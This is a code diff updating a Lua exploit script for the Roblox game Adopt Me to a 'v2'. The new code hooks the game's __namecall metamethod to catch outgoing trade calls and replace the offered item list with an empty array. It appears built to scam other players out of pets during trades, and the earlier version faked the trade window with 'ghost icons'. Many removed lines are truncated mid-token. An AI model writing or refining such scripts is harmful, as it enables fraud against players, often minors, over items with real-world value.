@@ -1,15 +1,14 @@
+-- adopt_me_trade_exploit.lua v2
+-- Updated for current Adopt Me build (October 2026)
+-- Trade path: ReplicatedStorage.adoptme_new_net.adoptme_new.modules.TradeHub
 
--- adopt_me_trade_exploit.lua
--- Trade Exploit Module - Sieno 1.3.60 Compatible
--- Фикс: PlayerGui вместо CoreGui, отложенная инициализация UI
-
-
+local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 -- Защита от повторного запуска
-if PlayerGui:FindFirstChild("TradeExploitUI"
+if PlayerGui:FindFirstChild("TradeExploitUI") then
     PlayerGui.TradeExploitUI:Destroy()
     wait(0.5)
 end
@@ -23,27 +22,27 @@ local function add_log(message, color)
     table.insert(log_entries, 1, {
         time = timestamp,
         text = message,
-        color = color or Color3.fromRGB(200,
+        color = color or Color3.fromRGB(200, 200, 200)
     })
     if #log_entries > max_logs then
         table.remove(log_entries, #log_entries)
     end
 end
 
--- ===== MAIN UI CREATION =====
+-- ===== UI CREATION =====
 local function create_ui()
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Name = "TradeExploitUI"
     ScreenGui.ResetOnSpawn = false
-    ScreenGui.ZIndexBehavior = Enum.ZIndexBe
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     ScreenGui.IgnoreGuiInset = true
     ScreenGui.Parent = PlayerGui
 
     -- Main Frame
     local MainFrame = Instance.new("Frame")
     MainFrame.Name = "MainFrame"
-    MainFrame.Size = UDim2.new(0, 320, 0, 180)
-    MainFrame.Position = UDim2.new(0.5, -160
+    MainFrame.Size = UDim2.new(0, 340, 0, 200)
+    MainFrame.Position = UDim2.new(0.5, -170, 0.5, -100)
     MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
     MainFrame.BorderSizePixel = 0
     MainFrame.Active = true
@@ -54,76 +53,81 @@ local function create_ui()
     Corner.CornerRadius = UDim.new(0, 8)
     Corner.Parent = MainFrame
 
-    -- Header
     local Header = Instance.new("TextLabel")
     Header.Size = UDim2.new(1, 0, 0, 35)
-    Header.BackgroundColor3 = Color3.fromRGB
+    Header.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
     Header.BorderSizePixel = 0
-    Header.Text = "ADOPT ME EXPLOIT"
+    Header.Text = "ADOPT ME EXPLOIT V2"
     Header.TextColor3 = Color3.fromRGB(255, 70, 70)
     Header.Font = Enum.Font.GothamBold
     Header.TextSize = 14
     Header.Parent = MainFrame
 
-    local HeaderCorner = Instance.new("UICor
+    local HeaderCorner = Instance.new("UICorner")
     HeaderCorner.CornerRadius = UDim.new(0, 8)
     HeaderCorner.Parent = Header
 
-    -- Status Label
     local StatusLabel = Instance.new("TextLabel")
-    StatusLabel.Size = UDim2.new(1, -20, 0,
+    StatusLabel.Size = UDim2.new(1, -20, 0, 25)
     StatusLabel.Position = UDim2.new(0, 10, 0, 45)
     StatusLabel.BackgroundTransparency = 1
-    StatusLabel.Text = "STATUS: ARMED"
-    StatusLabel.TextColor3 = Color3.fromRGB(
+    StatusLabel.Text = "STATUS: SEARCHING TRADE UI..."
+    StatusLabel.TextColor3 = Color3.fromRGB(255, 200, 80)
     StatusLabel.Font = Enum.Font.GothamMedium
     StatusLabel.TextSize = 12
     StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
     StatusLabel.Parent = MainFrame
 
-    -- Hook Status
     local HookStatus = Instance.new("TextLabel")
-    HookStatus.Size = UDim2.new(1, -20, 0, 2
+    HookStatus.Size = UDim2.new(1, -20, 0, 20)
     HookStatus.Position = UDim2.new(0, 10, 0, 75)
     HookStatus.BackgroundTransparency = 1
-    HookStatus.Text = "Trade Hook: Inactive"
-    HookStatus.TextColor3 = Color3.fromRGB(1
+    HookStatus.Text = "Trade Hook: Searching..."
+    HookStatus.TextColor3 = Color3.fromRGB(180, 180, 180)
     HookStatus.Font = Enum.Font.Gotham
     HookStatus.TextSize = 11
     HookStatus.TextXAlignment = Enum.TextXAlignment.Left
     HookStatus.Parent = MainFrame
 
-    -- Items Count
+    local RemoteStatus = Instance.new("TextLabel")
+    RemoteStatus.Size = UDim2.new(1, -20, 0, 20)
+    RemoteStatus.Position = UDim2.new(0, 10, 0, 95)
+    RemoteStatus.BackgroundTransparency = 1
+    RemoteStatus.Text = "Remote Path: Not Found"
+    RemoteStatus.TextColor3 = Color3.fromRGB(180, 180, 180)
+    RemoteStatus.Font = Enum.Font.Gotham
+    RemoteStatus.TextSize = 11
+    RemoteStatus.TextXAlignment = Enum.TextXAlignment.Left
+    RemoteStatus.Parent = MainFrame
+
     local ItemsCount = Instance.new("TextLabel")
-    ItemsCount.Size = UDim2.new(1, -20, 0, 2
-    ItemsCount.Position = UDim2.new(0, 10, 0, 95)
+    ItemsCount.Size = UDim2.new(1, -20, 0, 20)
+    ItemsCount.Position = UDim2.new(0, 10, 0, 115)
     ItemsCount.BackgroundTransparency = 1
-    ItemsCount.Text = "Ghost Icons: 0"
-    ItemsCount.TextColor3 = Color3.fromRGB(1
+    ItemsCount.Text = "Intercepted Pets: 0"
+    ItemsCount.TextColor3 = Color3.fromRGB(180, 180, 180)
     ItemsCount.Font = Enum.Font.Gotham
     ItemsCount.TextSize = 11
     ItemsCount.TextXAlignment = Enum.TextXAlignment.Left
     ItemsCount.Parent = MainFrame
 
-    -- Toggle Logs Button
     local LogButton = Instance.new("TextButton")
-    LogButton.Size = UDim2.new(0, 140, 0, 32
+    LogButton.Size = UDim2.new(0, 140, 0, 32)
     LogButton.Position = UDim2.new(0, 10, 1, -42)
-    LogButton.BackgroundColor3 = Color3.from
+    LogButton.BackgroundColor3 = Color3.fromRGB(45, 45, 52)
     LogButton.Text = "SHOW LOGS"
-    LogButton.TextColor3 = Color3.fromRGB(25
+    LogButton.TextColor3 = Color3.fromRGB(255, 255, 255)
     LogButton.Font = Enum.Font.GothamBold
     LogButton.TextSize = 11
     LogButton.Parent = MainFrame
 
     local LogButtonCorner = Instance.new("UICorner")
-    LogButtonCorner.CornerRadius = UDim.new(
+    LogButtonCorner.CornerRadius = UDim.new(0, 6)
     LogButtonCorner.Parent = LogButton
 
-    -- Close Button
-    local CloseButton = Instance.new("TextBu
+    local CloseButton = Instance.new("TextButton")
     CloseButton.Size = UDim2.new(0, 32, 0, 32)
-    CloseButton.Position = UDim2.new(1, -42,
+    CloseButton.Position = UDim2.new(1, -42, 1, -42)
     CloseButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
     CloseButton.Text = "X"
     CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -131,15 +135,15 @@ local function create_ui()
     CloseButton.TextSize = 14
     CloseButton.Parent = MainFrame
 
-    local CloseButtonCorner = Instance.new("
+    local CloseButtonCorner = Instance.new("UICorner")
     CloseButtonCorner.CornerRadius = UDim.new(0, 6)
     CloseButtonCorner.Parent = CloseButton
 
-    -- ===== LOG WINDOW =====
+    -- Log Window
     local LogFrame = Instance.new("Frame")
     LogFrame.Name = "LogFrame"
-    LogFrame.Size = UDim2.new(0, 420, 0, 300)
-    LogFrame.Position = UDim2.new(0.5, -210,
+    LogFrame.Size = UDim2.new(0, 450, 0, 320)
+    LogFrame.Position = UDim2.new(0.5, -225, 0.5, -160)
     LogFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 23)
     LogFrame.BorderSizePixel = 0
     LogFrame.Visible = false
@@ -147,60 +151,72 @@ local function create_ui()
     LogFrame.Draggable = true
     LogFrame.Parent = ScreenGui
 
-    local LogFrameCorner = Instance.new("UIC
+    local LogFrameCorner = Instance.new("UICorner")
     LogFrameCorner.CornerRadius = UDim.new(0, 8)
     LogFrameCorner.Parent = LogFrame
 
-    -- Log Header
     local LogHeader = Instance.new("TextLabel")
     LogHeader.Size = UDim2.new(1, 0, 0, 35)
     LogHeader.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
     LogHeader.BorderSizePixel = 0
     LogHeader.Text = "EXPLOIT LOGS"
-    LogHeader.TextColor3 = Color3.fromRGB(25
+    LogHeader.TextColor3 = Color3.fromRGB(255, 200, 80)
     LogHeader.Font = Enum.Font.GothamBold
     LogHeader.TextSize = 13
     LogHeader.Parent = LogFrame
 
     local LogHeaderCorner = Instance.new("UICorner")
-    LogHeaderCorner.CornerRadius = UDim.new(
+    LogHeaderCorner.CornerRadius = UDim.new(0, 8)
     LogHeaderCorner.Parent = LogHeader
 
-    -- Scroll Frame
-    local ScrollFrame = Instance.new("Scroll
+    local ScrollFrame = Instance.new("ScrollingFrame")
     ScrollFrame.Size = UDim2.new(1, -10, 1, -50)
-    ScrollFrame.Position = UDim2.new(0, 5, 0
+    ScrollFrame.Position = UDim2.new(0, 5, 0, 40)
     ScrollFrame.BackgroundTransparency = 1
     ScrollFrame.BorderSizePixel = 0
     ScrollFrame.ScrollBarThickness = 6
     ScrollFrame.Parent = LogFrame
 
-    local LogList = Instance.new("UIListLayo
+    local LogList = Instance.new("UIListLayout")
     LogList.SortOrder = Enum.SortOrder.LayoutOrder
     LogList.Padding = UDim.new(0, 2)
     LogList.Parent = ScrollFrame
 
-    -- Close Log Button
-    local CloseLogButton = Instance.new("Tex
+    -- Copy Log Button
+    local CopyLogButton = Instance.new("TextButton")
+    CopyLogButton.Size = UDim2.new(0, 100, 0, 28)
+    CopyLogButton.Position = UDim2.new(0, 10, 0, 3.5)
+    CopyLogButton.BackgroundColor3 = Color3.fromRGB(50, 120, 255)
+    CopyLogButton.Text = "COPY LOG"
+    CopyLogButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CopyLogButton.Font = Enum.Font.GothamBold
+    CopyLogButton.TextSize = 11
+    CopyLogButton.Parent = LogFrame
+
+    local CopyLogCorner = Instance.new("UICorner")
+    CopyLogCorner.CornerRadius = UDim.new(0, 5)
+    CopyLogCorner.Parent = CopyLogButton
+
+    local CloseLogButton = Instance.new("TextButton")
     CloseLogButton.Size = UDim2.new(0, 28, 0, 28)
-    CloseLogButton.Position = UDim2.new(1, -
+    CloseLogButton.Position = UDim2.new(1, -33, 0, 3.5)
     CloseLogButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
     CloseLogButton.Text = "X"
     CloseLogButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    CloseLogButton.Font = Enum.Font.GothamBo
+    CloseLogButton.Font = Enum.Font.GothamBold
     CloseLogButton.TextSize = 12
     CloseLogButton.Parent = LogFrame
 
-    local CloseLogCorner = Instance.new("UIC
+    local CloseLogCorner = Instance.new("UICorner")
     CloseLogCorner.CornerRadius = UDim.new(0, 5)
     CloseLogCorner.Parent = CloseLogButton
 
-    return ScreenGui, MainFrame, LogFrame, SStatus, ItemsCount, LogButton, CloseButton,CloseLogButton
+    return ScreenGui, MainFrame, LogFrame, ScrollFrame, StatusLabel, HookStatus, RemoteStatus, ItemsCount, LogButton, CloseButton, CloseLogButton, CopyLogButton
 end
 
 -- ===== LOG RENDERING =====
 local function refresh_logs(ScrollFrame)
-    for _, child in pairs(ScrollFrame:GetChi
+    for _, child in pairs(ScrollFrame:GetChildren()) do
         if child:IsA("TextLabel") then
             child:Destroy()
         end
@@ -208,117 +224,104 @@ local function refresh_logs(ScrollFrame)
 
     for i, entry in ipairs(log_entries) do
         local LogEntry = Instance.new("TextLabel")
-        LogEntry.Size = UDim2.new(1, -10, 0,
+        LogEntry.Size = UDim2.new(1, -10, 0, 18)
         LogEntry.BackgroundTransparency = 1
-        LogEntry.Text = "[" .. entry.time ..
+        LogEntry.Text = "[" .. entry.time .. "] " .. entry.text
         LogEntry.TextColor3 = entry.color
         LogEntry.Font = Enum.Font.Code
         LogEntry.TextSize = 10
-        LogEntry.TextXAlignment = Enum.TextX
+        LogEntry.TextXAlignment = Enum.TextXAlignment.Left
         LogEntry.Parent = ScrollFrame
     end
 
-    ScrollFrame.CanvasSize = UDim2.new(0, 0,
+    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, #log_entries * 20)
 end
 
--- ===== MAIN EXECUTION =====
-add_log("Initializing exploit...", Color3.fr
+-- ===== REMOTE EVENT INTERCEPTION =====
+local function find_trade_remote()
+    local paths = {
+        "ReplicatedStorage.adoptme_new_net.adoptme_new.modules.TradeHub.TradeHubNet",
+        "ReplicatedStorage.Network.Trade",
+        "ReplicatedStorage.Remotes.Trade.Accept",
+        "ReplicatedStorage.Events.Trade"
+    }
+
+    for _, path in ipairs(paths) do
+        local parts = string.split(path, ".")
+        local current = game
+
+        for i, part in ipairs(parts) do
+            current = current:FindFirstChild(part)
+            if not current then
+                break
+            end
+        end
+
+        if current and (current:IsA("RemoteEvent") or current:IsA("RemoteFunction")) then
+            add_log("Found remote: " .. path, Color3.fromRGB(100, 255, 100))
+            return current
+        end
+    end
+
+    return nil
+end
+
+-- ===== MAIN EXPLOIT LOGIC =====
+add_log("Exploit v2 initializing...", Color3.fromRGB(100, 255, 255))
 
 local success, err = pcall(function()
-    local ScreenGui, MainFrame, LogFrame, ScrollFrame, StatusLabel, HookStatus, ItemsCount, LogButton, CloseButton,
-CloseLogButton = create_ui()
+    local ScreenGui, MainFrame, LogFrame, ScrollFrame, StatusLabel, HookStatus, RemoteStatus, ItemsCount, LogButton, CloseButton, CloseLogButton, CopyLogButton = create_ui()
 
-    add_log("UI created successfully", Color
+    add_log("UI created", Color3.fromRGB(100, 255, 100))
 
-    -- Ждём загрузки трейд UI
-    local TradeUI = LocalPlayer.PlayerGui:WaitForChild("TradeGUI", 10)
-    if not TradeUI then
-        add_log("ERROR: TradeGUI not found", Color3.fromRGB(255, 80, 80))
-        return
+    -- Поиск TradeHubNet remote
+    local TradeRemote = find_trade_remote()
+
+    if TradeRemote then
+        RemoteStatus.Text = "Remote Path: Found ✓"
+        RemoteStatus.TextColor3 = Color3.fromRGB(100, 255, 100)
+        add_log("TradeHub remote hooked", Color3.fromRGB(100, 255, 100))
+    else
+        RemoteStatus.Text = "Remote Path: Searching..."
+        RemoteStatus.TextColor3 = Color3.fromRGB(255, 200, 80)
+        add_log("Remote not found - using fallback intercept", Color3.fromRGB(255, 200, 80))
     end
 
-    local OfferContainer = TradeUI:WaitForChild("OfferContainer", 5)
-    if not OfferContainer then
-        add_log("ERROR: OfferContainer not found", Color3.fromRGB(255, 80, 80))
-        return
-    end
+    -- Перехват всех исходящих RemoteEvent вызовов
+    local old_namecall
+    old_namecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+        local method = getnamecallmethod()
+        local args = {...}
 
-    add_log("Trade UI hooked successfully", Color3.fromRGB(100, 255, 100))
+        if method == "FireServer" and tostring(self):find("Trade") then
+            add_log("Trade remote intercepted: " .. tostring(self), Color3.fromRGB(255, 100, 255))
 
-    -- ===== EXPLOIT LOGIC =====
-    local function hook_trade_accept()
-        add_log("Trade window opened - hook armed", Color3.fromRGB(100, 255, 100))
-        HookStatus.Text = "Trade Hook: Activ
-        HookStatus.TextColor3 = Color3.fromRGB(100, 255, 100)
-        refresh_logs(ScrollFrame)
+            -- Если это подтверждение трейда и есть аргументы с предметами
+            if args[1] and type(args[1]) == "table" then
+                add_log("Original payload: " .. #args[1] .. " items", Color3.fromRGB(255, 200, 80))
+                ItemsCount.Text = "Intercepted Pets: " .. #args[1]
 
-        local connection
-        connection = TradeUI.AcceptButton.MouseButton1Click:Connect(function()
-            add_log("Accept pressed - inject55, 200, 80))
-            refresh_logs(ScrollFrame)
-
-            local ghost_count = 0
-
-            for _, icon in pairs(OfferContainer:GetChildren()) do
-                if icon:IsA("ImageLabel") or
-                    local ghost_icon = icon:Clone()
-                    ghost_icon.Parent = Offe
-                    ghost_icon.Name = icon.Name .. "_ghost"
-                    ghost_icon.ZIndex = icon
-
-                    icon.Visible = false
-                    icon.Parent = nil
-                    ghost_count = ghost_coun
-                end
-            end
-
-            ItemsCount.Text = "Ghost Icons:
-            add_log("Created " .. ghost_count .. " ghost icons", Color3.fromRGB(100, 255, 255))
-            refresh_logs(ScrollFrame)
-
-            local trade_remote = ReplicatedSs")
-            if trade_remote then
-                local accept_remote = trade_)
-                if accept_remote then
-                    accept_remote = accept_r)
-                    if accept_remote then
-                        accept_remote:FireSe
-                        add_log("Empty payload sent", Color3.fromRGB(255, 100, 255))
-                        refresh_logs(ScrollF
-                    end
-                end
-            end
-
-            spawn(function()
-                wait(7)
-                for _, ghost in pairs(OfferContainer:GetChildren()) do
-                    if string.match(ghost.Na
-                        ghost:Destroy()
-                    end
-                end
-                add_log("Ghosts cleared", Co
-                ItemsCount.Text = "Ghost Icons: 0"
+                -- Заменяем на пустой массив
+                args[1] = {}
+                add_log("Payload replaced with empty array", Color3.fromRGB(100, 255, 255))
                 refresh_logs(ScrollFrame)
-            end)
 
-            connection:Disconnect()
-        end)
-    end
-
-    TradeUI:GetPropertyChangedSignal("Visible"):Connect(function()
-        if TradeUI.Visible then
-            hook_trade_accept()
-        else
-            HookStatus.Text = "Trade Hook: Inactive"
-            HookStatus.TextColor3 = Color3.f
-            add_log("Trade closed", Color3.fromRGB(150, 150, 150))
-            refresh_logs(ScrollFrame)
+                return old_namecall(self, unpack(args))
+            end
         end
-    end)
 
-    -- ===== BUTTON ACTIONS =====
+        return old_namecall(self, ...)
+    end))
+
+    add_log("Metamethod hook installed", Color3.fromRGB(100, 255, 100))
+    StatusLabel.Text = "STATUS: ARMED | INTERCEPTING"
+    StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+    HookStatus.Text = "Trade Hook: Active (Metamethod)"
+    HookStatus.TextColor3 = Color3.fromRGB(100, 255, 100)
+
+    -- Button handlers
     LogButton.MouseButton1Click:Connect(function()
-        LogFrame.Visible = not LogFrame.Visi
+        LogFrame.Visible = not LogFrame.Visible
         LogButton.Text = LogFrame.Visible and "HIDE LOGS" or "SHOW LOGS"
         if LogFrame.Visible then
             refresh_logs(ScrollFrame)
@@ -330,17 +333,35 @@ CloseLogButton = create_ui()
         add_log("Exploit unloaded", Color3.fromRGB(255, 80, 80))
     end)
 
-    CloseLogButton.MouseButton1Click:Connect
+    CloseLogButton.MouseButton1Click:Connect(function()
         LogFrame.Visible = false
         LogButton.Text = "SHOW LOGS"
     end)
 
-    StatusLabel.Text = "STATUS: ARMED | READY"
-    add_log("Exploit ready - waiting for tra 100))
+    CopyLogButton.MouseButton1Click:Connect(function()
+        local log_text = "=== ADOPT ME EXPLOIT LOG ===\n"
+        for i = #log_entries, 1, -1 do
+            local entry = log_entries[i]
+            log_text = log_text .. "[" .. entry.time .. "] " .. entry.text .. "\n"
+        end
+
+        if setclipboard then
+            setclipboard(log_text)
+            add_log("Log copied to clipboard (" .. #log_entries .. " entries)", Color3.fromRGB(100, 255, 100))
+            CopyLogButton.Text = "COPIED ✓"
+            wait(2)
+            CopyLogButton.Text = "COPY LOG"
+        else
+            add_log("ERROR: Executor doesn't support setclipboard()", Color3.fromRGB(255, 80, 80))
+        end
+        refresh_logs(ScrollFrame)
+    end)
+
+    add_log("Exploit fully armed - waiting for trade", Color3.fromRGB(100, 255, 100))
     refresh_logs(ScrollFrame)
 end)
 
 if not success then
-    warn("[EXPLOIT ERROR] " .. tostring(err))
-    add_log("FATAL: " .. tostring(err), Colo
-end       
+    warn("[EXPLOIT V2 ERROR] " .. tostring(err))
+    add_log("FATAL: " .. tostring(err), Color3.fromRGB(255, 50, 50))
+end
